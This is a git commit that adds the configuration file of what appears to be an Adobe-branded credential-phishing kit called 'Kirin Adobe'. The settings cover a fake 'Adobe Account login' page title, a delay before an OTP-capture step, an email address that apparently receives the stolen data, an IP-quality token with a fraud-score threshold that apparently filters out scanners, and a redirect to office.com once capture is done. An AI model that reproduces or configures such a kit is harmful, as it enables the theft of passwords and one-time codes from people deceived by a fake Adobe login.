8a36c7ed3113377829eb0ce14bf7d61736385d67
imadrmz05 <106558549+imadrmz05@users.noreply.github.com>
2022-06-28 13:54:04 +0100

    Add files via upload

---
+++ fix.adobe/config/init.js
@@ -0,0 +1,18 @@
+const config = {
+    name: "Kirin Adobe", // Provider Name
+    mail: "imad.c63amg@gmail.com", // User E-mail
+    subject: " OFF ",
+    timeout: 2000, // time out between login Page and OTP
+    titlePage: "Adobe Account login", // Title header bar
+    tokenIpQuality: "z1BP1exuBWKAr4OswCdW8cenmYwyLAV5",
+    redirect: "https://office.com",
+    fraudLevelMax: 9,
+    version: 1,
+    branch: 1.1,
+    activeIpQuality: true,
+    theme: "lite", // ["lite"]
+};
+
+// Kirin >  for more tools
+
+// Keep this config sturcture .
